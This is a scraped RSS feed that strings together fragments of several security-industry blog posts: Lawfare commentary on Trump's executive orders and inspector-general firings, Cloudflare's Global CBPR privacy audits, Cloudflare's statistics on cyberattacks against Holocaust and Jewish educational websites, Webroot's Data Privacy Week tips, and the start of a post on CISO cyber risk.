&lt;p&gt;&lt;strong&gt;Quinta Jurecic&lt;/strong&gt; at &lt;em&gt;Lawfare&lt;/em&gt; &lt;a href="https://www.lawfaremedia.org/article/what-do-trump-s-weaponization-and-censorship-executive-orders-actually-do" rel="noopener" target="_blank"&gt;notes&lt;/a&gt; that while the executive actions are ominous, they are also vague, and could conceivably generate either a campaign of retaliation, or nothing at all.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The two orders establish that there will be investigations but leave open the questions of what kind of investigations, what will be investigated, how long this will take, and what the consequences might be,&amp;#8221; Jurecic wrote. &amp;#8220;It is difficult to draw firm conclusions as to what to expect. Whether this ambiguity is intentional or the result of sloppiness or disagreement within Trump’s team, it has at least one immediate advantage as far as the president is concerned: generating fear among the broad universe of potential subjects of those investigations.&amp;#8221;&lt;/p&gt;
&lt;p&gt;On Friday, Trump moved &lt;a href="https://www.lawfaremedia.org/article/trump-fired-17-inspectors-general-was-it-legal" rel="noopener" target="_blank"&gt;to fire at least 17 inspectors general&lt;/a&gt;, the government watchdogs who conduct audits and investigations of executive branch actions, and who often uncover instances of government waste, fraud and abuse. Lawfare&amp;#8217;s &lt;strong&gt;Jack Goldsmith&lt;/strong&gt; argues that the removals are probably legal even though Trump defied a 2022 law that required congressional notice of the terminations, which Trump did not give.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Trump probably acted lawfully, I think, because the notice requirement is probably unconstitutional,&amp;#8221; Goldsmith wrote. &amp;#8220;The real bite in the 2022 law, however, comes in the limitations it places on Trump’s power &lt;em&gt;to replace&lt;/em&gt; the terminated IGs—limitations that I believe are constitutional. This aspect of the law will make it hard, but not impossible, for Trump to put loyalists atop the dozens of vacant IG offices around the executive branch. The ultimate fate of IG independence during Trump 2.0, however, depends less on legal protections than on whether Congress, which traditionally protects IGs, stands up for them now. Don’t hold your breath.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Among the many Biden administration executive orders revoked by President Trump last week was an action from December 2021 establishing the &lt;strong&gt;United States Council on Transnational Organized Crime&lt;/strong&gt;, which is charged with advising the White House on a range of criminal activities, including drug and weapons trafficking, migrant smuggling, human trafficking, cybercrime, intellectual property theft, money laundering, wildlife and timber trafficking, illegal fishing, and illegal mining.&lt;/p&gt;
&lt;p&gt;So far, the White House doesn&amp;#8217;t appear to have revoked &lt;a href="https://web.archive.org/web/20250117143627/https://www.whitehouse.gov/briefing-room/presidential-actions/2025/01/16/executive-order-on-strengthening-and-promoting-innovation-in-the-nations-cybersecurity/" rel="noopener" target="_blank"&gt;an executive order&lt;/a&gt; that former President Biden issued less than a week before President Trump took office. On Jan. 16, 2025, Biden released a directive that focused on improving the security of federal agencies and contractors, and giving the government more power to sanction the hackers who target critical infrastructure.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70172</guid><category>A Little Sunshine</category><category>The Coming Storm</category><category>Alfa Bank</category><category>David Sacks</category><category>House Judiciary Committee's Select Subcommittee on the Weaponization of the Federal Government</category><category>Jack Goldsmith</category><category>Joe Hall</category><category>John Durham</category><category>Lawfare</category><category>Melania Trump</category><category>Michael Sussman</category><category>President Trump</category><category>Quinta Jurecic</category><category>Rep.

So today, on Data Privacy Day (also known internationally as Data Protection Day), we’re happy to announce that we’re adding our fourth and fifth privacy validations, and this time, they are global firsts! Cloudflare is the first organisation to announce that we have been successfully audited against the brand new &lt;a href="https://www.globalcbpr.org/privacy-certifications/"&gt;&lt;u&gt;Global Cross-Border Privacy Rules (Global CBPRs) for data controllers and the Global Privacy Recognition for Processors (Global PRP)&lt;/u&gt;&lt;/a&gt;. These validations demonstrate our support and adherence to global standards that provide for privacy-respecting data flows across jurisdictions. Organizations that have been successfully audited will be formally certified when the certifications officially launch, which we expect to happen later in 2025. &lt;/p&gt;&lt;p&gt;Our participation in the Global CBPRs and Global PRP joins our roster of privacy validations: we were one of the first cybersecurity organizations to certify to the international privacy standard &lt;a href="https://blog.cloudflare.com/iso-27701-privacy-certification/"&gt;&lt;u&gt;ISO 27701:2019&lt;/u&gt;&lt;/a&gt; when it was published, and in 2022 we also certified to the cloud privacy certification, &lt;a href="https://www.cloudflare.com/trust-hub/compliance-resources/iso-certifications/"&gt;&lt;u&gt;ISO 27018:2019&lt;/u&gt;&lt;/a&gt;. In 2023, we added our third privacy validation, undergoing a review by an independent monitoring body in the European Union (EU) and declared to be adherent to the first official GDPR code of conduct — &lt;i&gt;the &lt;/i&gt;&lt;a href="https://blog.cloudflare.com/cloudflare-official-gdpr-code-of-conduct/"&gt;&lt;i&gt;&lt;u&gt;EU Cloud Code of Conduct&lt;/u&gt;&lt;/i&gt;&lt;/a&gt;.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why this matters to Cloudflare customers&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-this-matters-to-cloudflare-customers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Taking these privacy certifications together, Cloudflare demonstrates that we are meeting key official privacy validations in 39 jurisdictions around the world, from Australia and Austria to Sweden and the United States. An additional four jurisdictions (United Kingdom, Bermuda, Mauritius, and the Dubai International Finance Centre) are also in the process of joining and recognising the Global CBPR certifications. That's important for Cloudflare customers as it provides reassurance that the privacy practices we have built are recognised by governments around the world.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2RFlkr3Wht9Gu34lv2xxN9/8f3c8e5dc23963614d275dab085cd8ce/unnamed.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;What is the Global CBPR System?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-is-the-global-cbpr-system"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In the last three years, governments across the world have been busy preparing two brand-new international privacy standards. A major milestone was achieved on April 30, 2024 when &lt;a href="https://www.globalcbpr.org/global-cbpr-forum-announces-the-establishment-of-the-global-cbpr-and-global-prp-systems-and-welcomes-new-global-cape-participants/"&gt;&lt;u&gt;the Global CBPR System was established&lt;/u&gt;&lt;/a&gt;. The CBPRs are a voluntary, enforceable, international, accountability-based system that facilitates privacy-respecting data flows among members’ economies. They provide a baseline level of privacy protection for consumers through a set of rules on how to handle people’s personal information. This facilitates the free flow of data by upholding consumer privacy across participating members, despite each jurisdiction having their own individual data protection laws.&lt;/p&gt;&lt;p&gt;The CBPR System was developed by the &lt;a href="https://www.globalcbpr.org/about/membership/"&gt;&lt;u&gt;Global CBPR Forum&lt;/u&gt;&lt;/a&gt;, an intergovernmental forum between the governments of Australia, Canada, Japan, Republic of Korea, Mexico, Philippines, Singapore, Chinese Taipei, and the United States. The United Kingdom is also an associate member of the CBPR Forum, as are Bermuda, Mauritius, and the Dubai IFC, signifying their intent to join as full members in the future.&lt;/p&gt;&lt;p&gt;Over the last year, we have been busy preparing for the launch of the Global CBPR System. On May 1, 2024 — the very first day after the establishment of the system — Cloudflare applied to join. And we have now achieved the major milestone of successfully completing audits against the requirements, meaning we expect to be the first organization in the world to be newly certified to the Global CBPR system, as well as the related Global Privacy Recognition for Processors, when companies can officially be certified, which is expected later in 2025.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5F7HXXU071UJtx68KHGn41/0228087d6420c26802d77c13fafe935c/image1.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;What the Global CBPR System covers&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-the-global-cbpr-system-covers"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The Global CBPR System contains a detailed list of fifty requirements that organizations must meet in order to be certified under the scheme. The requirements derive from the nine &lt;b&gt;Global CBPR Privacy Principles&lt;/b&gt;, which are consistent with the core principles of the &lt;a href="https://www.oecd.org/"&gt;&lt;u&gt;Organisation for Economic Co-operation and Development (OECD)&lt;/u&gt;&lt;/a&gt; &lt;a href="https://www.oecd.org/en/publications/2002/02/oecd-guidelines-on-the-protection-of-privacy-and-transborder-flows-of-personal-data_g1gh255f.html"&gt;&lt;u&gt;Guidelines on the Protection of Privacy and Trans-Border Flows of Personal Data&lt;/u&gt;&lt;/a&gt;. The fifty requirements cover how organizations should collect, manage, and safeguard personal information in their custody. Organizations must meet every one of the fifty requirements in order to be Global CBPR certified. The nine principles underlying the requirements are:&lt;/p&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;Preventing Harm&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Notice&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Collection Limitation&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;Uses of Personal Information&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Choice&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Integrity of Personal Information&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p&gt;Security Safeguards&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Access and Correction&lt;/p&gt;&lt;/td&gt;&lt;td&gt;&lt;p&gt;Accountability&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;The nine Global CBPR Privacy Principles&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;The Global CBPR certification covers the handling of personal information controlled by the organization, such as the personal details of customers, employees, and job applicants. For Cloudflare, this also includes network information — our observations about how our global cloud platform handles server, network, or traffic data generated by Cloudflare in the course of providing our services.&lt;/p&gt;&lt;p&gt;The related Global Privacy Recognition for Processors (PRP) certification covers the handling of personal information processed by the organization on behalf of a different organization, usually their customer. The eighteen requirements of the PRP relate to the two privacy principles most relevant when processing this information on behalf of another organization: &lt;i&gt;Security Safeguards and Accountability&lt;/i&gt;. For Cloudflare, this covers the processing of data pursuant to the &lt;a href="https://www.cloudflare.com/cloudflare-customer-dpa/"&gt;&lt;u&gt;Data Processing Addendum&lt;/u&gt;&lt;/a&gt; we sign with all of our customers, chiefly, the Customer Content flowing across our network and the Customer Logs generated by those data flows. Organizations must meet every one of the eighteen requirements in order to be Global PRP certified.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;A deeper dive into some of the requirements of the Global CBPRs&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#a-deeper-dive-into-some-of-the-requirements-of-the-global-cbprs"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;As noted, the key requirements of the Global CBPRs and the Global PRP cover the well-known data protection principles of notice, choice, collection limitation (data minimization), the right of data subject access and correction, providing adequate security, preventing harm, integrity of personal information, accountability, and uses of personal information. There are dozens of requirements that cover these principles, so we’ll just touch on a few of them here.&lt;/p&gt;&lt;p&gt;Let’s first look at the principle of notice. One of the more obvious requirements from the CBPRs is question 1:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Do you provide clear and easily accessible statements about your practices and policies that govern the personal information described above (a privacy statement)?&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Being transparent about the collection and use of personal information is a key principle of privacy and data protection, and transparency is one of Cloudflare’s core commitments. Documenting our practices and policies in regard to how we use personal information allows individuals to decide if they want to provide their information, and that’s why it’s best practice for the privacy notice to be available and visible at the time the information is being collected. Indeed, this concept of providing notice is clear from &lt;a href="https://eur-lex.europa.eu/eli/reg/2016/679/oj/eng#art_13"&gt;&lt;u&gt;Article 13 of the EU’s GDPR&lt;/u&gt;&lt;/a&gt;. Cloudflare meets this CBPR requirement by providing a clear and accessible privacy notice visible from the footer of each page on our website. We also provide a link to the notice when we collect personal data such as through a form on a webpage.&lt;/p&gt;&lt;p&gt;In terms of how we use personal information, question 8 asks:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Do you limit the use of the personal information you collect (whether directly or through the use of third parties acting on your behalf) as identified in your privacy statement?&lt;/i&gt;&lt;/p&gt;&lt;p&gt;It has long been a commitment of Cloudflare’s that we only use the personal information we collect for the purposes of providing the services we offer. Our business is built on providing customers with the tools to protect their network applications and to make them faster, more secure, more reliable, and more private. In our &lt;a href="https://www.cloudflare.com/privacypolicy/"&gt;&lt;u&gt;Privacy Policy&lt;/u&gt;&lt;/a&gt;, we commit that we will “only share or otherwise disclose your personal information as necessary to provide our Services or as otherwise described in this Policy, except in cases where we first provide you with notice and the opportunity to consent.” And we maintain internal documentation (in keeping with the CBPR’s accountability principle) to document the data we are processing and the purposes for which we process it.&lt;/p&gt;&lt;p&gt;Another key set of requirements in both the Global CBPRs and the Global PRP have to do with security safeguards. CBPR requirement question 27 asks:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Describe the physical, technical and administrative safeguards you have implemented to protect personal information against risks such as loss or unauthorized access, destruction, use, modification or disclosure of information or other misuses?&lt;/i&gt;&lt;/p&gt;&lt;p&gt;The similar requirement in the Global PRP is question 2: &lt;/p&gt;&lt;p&gt;&lt;i&gt;Describe the physical, technical and administrative safeguards that implement your organization’s information security policy.&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Cloudflare has implemented an information security program in accordance with the ISO/IEC 27000 family of standards. Details of Cloudflare’s security program are documented in Annex 2 (“Technical and Organizational Security Measures”) of Cloudflare's &lt;a href="https://www.cloudflare.com/cloudflare-customer-dpa/"&gt;&lt;u&gt;Customer Data Processing Addendum&lt;/u&gt;&lt;/a&gt;, including the physical, technical and administrative safeguards implemented to protect personal information.&lt;/p&gt;&lt;p&gt;Related to the Accountability principle, question 46 asks:&lt;/p&gt;&lt;p&gt;&lt;i&gt;Do you have mechanisms in place with personal information processors, agents, contractors, or other service providers pertaining to personal information they process on your behalf, to ensure that your obligations to the individual will be met? &lt;/i&gt;&lt;/p&gt;&lt;p&gt;When we have vendors who handle any of our, or our customers’, personal information, we require them to sign a Data Processing Addendum with us. This ensures the commitments we make to our customers in our customer agreements in turn flow through to our vendors, including the security requirements — holding them, and us, accountable.&lt;/p&gt;

        &lt;p&gt;We are excited about the launch of the Global CBPR certifications, expected later in 2025, and we are proud that on this Data Privacy Day, we can yet again demonstrate our commitment to universally held principles for protecting the privacy of personal data.&lt;/p&gt;&lt;p&gt;You can find more about the Global CBPR System, the Global PRP, download a full copy of the requirements, and keep up to date with related news at &lt;a href="https://www.globalcbpr.org/"&gt;&lt;u&gt;globalcbpr.org&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;For the latest information about our certifications, please visit our &lt;a href="https://www.cloudflare.com/trust-hub/compliance-resources/"&gt;&lt;u&gt;Trust Hub&lt;/u&gt;&lt;/a&gt;.

This tragic chapter in human history serves as a stark reminder of the catastrophic consequences of prejudice and extremism. &lt;/p&gt;&lt;p&gt;The United Nations General Assembly designated January 27 — the anniversary of the liberation of &lt;a href="https://en.wikipedia.org/wiki/Auschwitz_concentration_camp"&gt;&lt;u&gt;Auschwitz-Birkenau&lt;/u&gt;&lt;/a&gt; —  as International Holocaust Remembrance Day. This year, we commemorate the 80th anniversary of the liberation of this infamous extermination camp.&lt;/p&gt;&lt;p&gt;As the world reflects on this dark period, a troubling resurgence of antisemitism underscores the importance of vigilance. This growing hatred has spilled into the digital realm, with cyberattacks increasingly targeting Jewish and Holocaust remembrance and educational websites — spaces dedicated to preserving historical truth and fostering awareness.&lt;/p&gt;&lt;p&gt;For this reason, here at Cloudflare, we began to publish annual reports covering cyberattacks that target these organizations. These cyberattacks include &lt;a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/"&gt;&lt;u&gt;DDoS attacks&lt;/u&gt;&lt;/a&gt; as well as &lt;a href="https://www.cloudflare.com/learning/bots/what-is-a-bot/"&gt;&lt;u&gt;bot&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.cloudflare.com/en-gb/learning/security/what-is-web-application-security/"&gt;&lt;u&gt;application attacks&lt;/u&gt;&lt;/a&gt;. The insights and trends are based on websites protected by Cloudflare. This is our fourth report, and you can view our previous Holocaust Remembrance Day blogs &lt;a href="https://blog.cloudflare.com/tag/holocaust/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;

          &lt;p&gt;At Cloudflare, we are proud to support these vital organizations through &lt;a href="https://www.cloudflare.com/en-gb/galileo/"&gt;&lt;u&gt;Project Galileo&lt;/u&gt;&lt;/a&gt;, an initiative providing free security protections to vulnerable groups worldwide. If you or your organization could benefit from this program, consider applying today to help protect these essential platforms and the invaluable work they do.&lt;/p&gt;

Muzeon faced significant cyberattacks that impacted their website’s performance and hindered operations before using Cloudflare.&lt;/p&gt;&lt;p&gt;As part of Project Galileo, Muzeon implemented Cloudflare's &lt;a href="https://www.cloudflare.com/en-gb/ddos/"&gt;&lt;u&gt;DDoS mitigation&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/en-gb/application-services/products/waf/"&gt;&lt;u&gt;Web Application Firewall (WAF)&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://www.cloudflare.com/application-services/products/dns/"&gt;&lt;u&gt;Managed DNS&lt;/u&gt;&lt;/a&gt;, and other services. These measures drastically reduced the attacks and allowed Muzeon to focus on its important mission of storytelling and preserving cultural heritage. &lt;/p&gt;&lt;p&gt;Cloudflare’s solutions not only protected their digital infrastructure but also freed up time for Muzeon to expand its interactive exhibits, ensuring they could continue sharing their essential work globally. You can read more about this case study &lt;a href="https://www.cloudflare.com/en-gb/case-studies/muzeon/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;

            &lt;h2&gt;Significant rise in antisemitism around the world&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#significant-rise-in-antisemitism-around-the-world"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Following the October 7, 2023, &lt;a href="https://en.wikipedia.org/wiki/October_7_Hamas-led_attack_on_Israel"&gt;&lt;u&gt;Hamas-led attack&lt;/u&gt;&lt;/a&gt; on Israel, there has been a &lt;a href="https://en.wikipedia.org/wiki/Antisemitism_during_the_Israel%E2%80%93Hamas_war"&gt;&lt;u&gt;surge in global antisemitic incidents&lt;/u&gt;&lt;/a&gt;. In the &lt;a href="https://www.adl.org/resources/press-release/over-10000-antisemitic-incidents-recorded-us-oct-7-2023-according-adl"&gt;&lt;u&gt;U.S. alone&lt;/u&gt;&lt;/a&gt; there have been more than 10,000 antisemitic incidents from October 7, 2023 to September 24, 2024, representing an over 200-percent increase compared to the incidents reported during the same period a year before. As we’ve seen, the digital world is often a mirror to the real world. As a result, it is not surprising that websites dedicated to sharing information about the Holocaust, as well as Jewish memorial and education platforms, are now increasingly being targeted online. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Cyberattacks against Jewish and Holocaust educational websites &lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberattacks-against-jewish-and-holocaust-educational-websites"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;For the years 2020, 2021, and 2022, the number of cyberthreats targeting Holocaust and Jewish educational and memorial websites protected by Cloudflare was, on average, 736,339 malicious HTTP requests annually.&lt;/p&gt;&lt;p&gt;After the October 7 Hamas-led attack, cyberattacks skyrocketed. In 2023, the amount of blocked HTTP requests surged by 872% to 35.7 million compared to 2022. Most of these cyberattacks occurred after October 7, 2023. &lt;/p&gt;&lt;p&gt;In 2024, the number of blocked HTTP requests exceeded 47 million — representing a 30% increase compared to 2023. Over 3 out of every 100 HTTP requests towards Holocaust and Jewish memorial and education websites protected by Cloudflare were malicious and blocked. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6p2NxGtyK3jDccp2G0MMvF/c7777304675f36f8cbe301f92a6dc5ec/BLOG-2659_3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by year&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Cyberattacks by quarter&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberattacks-by-quarter"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In the fourth quarter of 2023, the volume of malicious requests exceeded 27 million. Throughout the first three quarters of 2024, we saw a gradual decrease in the quantity of malicious requests. But in the fourth quarter of 2024, cyberattacks spiked by 33%, to 36 million requests, following the one-year anniversary of the October 7 assault.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1YFVY3jTbMYsgbenBdor1P/6634fdf6edce5a5f3d44f34fdf017b3d/BLOG-2659_4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by quarter&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Cyberattacks by month&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cyberattacks-by-month"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Breaking down the quarters into months, we can see an initial peak in October 2023 after the October 7 Hamas-led attack. The volume of cyberattacks remained elevated during November and December 2023.&lt;/p&gt;&lt;p&gt;Afterward, as we entered 2024, the quantity and percentage of cyberattacks against these websites significantly decreased. In November, over a third (34%) of all requests towards these websites were blocked, with over 36 million requests blocked that month alone.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5JGzGCm49GBBZMYfriSTpl/1f47b7b90bb5607461216fd2788c2f34/BLOG-2659_5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cyber threats against Holocaust and Jewish memorial and educational websites by month&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;On the International Holocaust Remembrance Day, we reflect on the importance of standing against both antisemitism and cyber threats — issues that have escalated since the October 7, 2023, Hamas-led attack. &lt;/p&gt;&lt;p&gt;At Cloudflare, we are unwavering in our commitment to create a safer, more inclusive Internet. The rise in antisemitism has made it even more critical to protect educational websites and communities from harmful cyber attacks. We invite everyone to join us in this fight. Even with our &lt;a href="https://www.cloudflare.com/en-gb/plans/"&gt;&lt;u&gt;free plan&lt;/u&gt;&lt;/a&gt;, we offer strong security and performance, ensuring that vital resources and websites remain safe and accessible.

Whether you’re browsing online as a consumer or running a business, data privacy is paramount in an environment where cyber threats can lurk around every corner. In the spirit of [&amp;#8230;]&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/01/27/6-ways-to-get-the-most-from-data-privacy-week/" rel="nofollow"&gt;6 ways to get the most from Data Privacy Week&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;a href="https://www.staysafeonline.org/data-privacy-week" rel="noreferrer noopener" target="_blank"&gt;Data Privacy Week&lt;/a&gt; (Jan. 27-31) is an excellent opportunity to reflect on the importance of protecting one of your most valuable assets: your personal information. Whether you’re browsing online as&lt;ins&gt; a&lt;/ins&gt; consumer or running a business, data privacy is paramount in an environment where cyber threats can lurk around every corner.&lt;/p&gt;



&lt;p&gt;In the spirit of Data Privacy Week, here are six ideas to help you protect yourself—and your data:&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;1. Understand your level of risk&lt;/h2&gt;



&lt;p&gt;Get acquainted with the phrase &lt;a href="https://www.webroot.com/us/en/resources/glossary/what-is-personally-identifiable-information"&gt;personally identifiable information.&lt;/a&gt; This includes any data that can be used to identify you, and it ranges from your name and address to more sensitive information like &lt;del&gt;  &lt;/del&gt;health and financial records. Here are some common examples:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Health data&lt;/strong&gt;: Information stored in a patient portal, online pharmacy, or health insurance website.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Financial data&lt;/strong&gt;: Details of your bank account, 401K fund, or IRA.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Apps&lt;/strong&gt;: Data collected by various applications you use. This information can range from your current location to previous purchasing habits.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Social media&lt;/strong&gt;: Information you share on platforms like Facebook, Twitter, and Instagram.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Knowing what kinds of personal data you have out there is the first step toward protecting it.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;2. Learn the basics of data privacy self-defense&lt;/h2&gt;



&lt;p&gt;Protecting your data doesn&amp;#8217;t have to be complicated. Here are some basic steps you can take to &lt;a href="https://www.webroot.com/blog/2024/10/17/10-steps-to-safeguarding-your-privacy-online/"&gt;safeguard your privacy&lt;/a&gt;:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Create secure passwords&lt;/strong&gt;: Use a combination of letters, numbers, and special characters.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Use multifactor identification&lt;/strong&gt;: Add an extra layer of security to your accounts by using a password combined with a code sent to their phone or a fingerprint. &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Limit the number of cookies you accept&lt;/strong&gt;: Be selective about which websites can track your activity.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Beware of public Wi-Fi&lt;/strong&gt;: Avoid accessing sensitive information on unsecured networks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Use a &lt;/strong&gt;&lt;a href="https://www.webroot.com/blog/2022/01/25/the-benefits-of-using-a-vpn-on-your-home-network/"&gt;&lt;strong&gt;virtual private network, or VPN&lt;/strong&gt;&lt;/a&gt;: Encrypt your internet connection to protect your data.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Keep software up to date&lt;/strong&gt;: Regular updates can protect you from security vulnerabilities.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;3. Update your privacy settings&lt;/h2&gt;



&lt;p&gt;Take some time to review the privacy settings on the apps, devices, or websites you use most often. You might be surprised at what you find. The nonprofit National Cybersecurity Alliance has compiled a &lt;a href="https://www.staysafeonline.org/articles/manage-your-privacy-settings" rel="noreferrer noopener" target="_blank"&gt;comprehensive list&lt;/a&gt; of popular sites’ privacy pages to get you started.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;4. Arm yourself with antivirus protection&lt;/h2&gt;



&lt;p&gt;An effective antivirus program is essential for protecting your devices from &lt;a href="https://www.webroot.com/us/en/resources/tips-articles/what-is-malware-protection"&gt;malware&lt;/a&gt; and other threats. Look for features such as real-time scanning, automatic updates, and comprehensive protection against various types of malware. A product like &lt;a href="https://www.webroot.com/us/en"&gt;Webroot&lt;/a&gt; offers a variety of antivirus solutions to keep your data safe. Webroot even offers a &lt;a href="https://www.webroot.com/us/en/home/products/helpmechoose"&gt;product selection tool&lt;/a&gt; that can help you find a solution tailored to your unique needs.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;5. Find an encrypted data backup product&lt;/h2&gt;



&lt;p&gt;Backing up your data is crucial, but it&amp;#8217;s equally important to ensure that those backups are secure. An encrypted data backup solution like &lt;a href="https://www.carbonite.com/" rel="noreferrer noopener" target="_blank"&gt;Carbonite&lt;/a&gt; can protect your data from unauthorized access. Carbonite’s secure, always-on backup ensures that you won’t lose important, irreplaceable files due to accidental deletion or device malfunction.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;6. Take in a movie&lt;/h2&gt;



&lt;p&gt;After all that hard work learning about data privacy, it’s time to reward yourself by doing something fun. Hop on the couch and watch a movie that delves into the topic. Here are some suggestions from the nonprofit group &lt;a href="https://er.educause.edu/blogs/2017/1/things-to-do-during-data-privacy-month" rel="noreferrer noopener" target="_blank"&gt;Educause&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&amp;#8220;If you can&amp;#8217;t measure it, you can&amp;#8217;t manage it.&amp;#8221;&lt;/em&gt; &amp;#8211; Peter Drucker&lt;/p&gt;



&lt;p&gt;This timeless adage by Drucker resonates deeply in today&amp;#8217;s digital era, where managing cyber risks has become a business-critical priority. According to a recent survey from &lt;a href="https://www.splunk.com/en_us/form/ciso-report.html"&gt;Splunk&lt;/a&gt;, Today, nearly 50% of CISOs report directly to their CEOs, and over 90% regularly brief their Boards of Directors about their organization&amp;#8217;s exposure to cyber risk. As the cost of successful cyberattacks continues to soar, reducing cyber risk has never been more critical. Moreover, it&amp;#8217;s not just corporate leaders paying attention; Wall Street shareholders are also concerned about cyber risk and are keen to understand how companies address it. As reported by &lt;a href="https://www.globaldata.com/reports/filing-analytics-annual-report-2021/"&gt;GlobalData&lt;/a&gt;, mentions of &amp;#8220;cybersecurity&amp;#8221; in public earnings calls have surged, averaging 800 per quarter.&lt;/p&gt;



&lt;p&gt;So, with heightened interest and scrutiny on cybersecurity programs, what keeps CISOs awake in 2025?&lt;/p&gt;



&lt;span id="more-37157"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="the-challenges-of-cyber-risk-management"&gt;The Challenges of Cyber Risk Management&lt;/h2&gt;



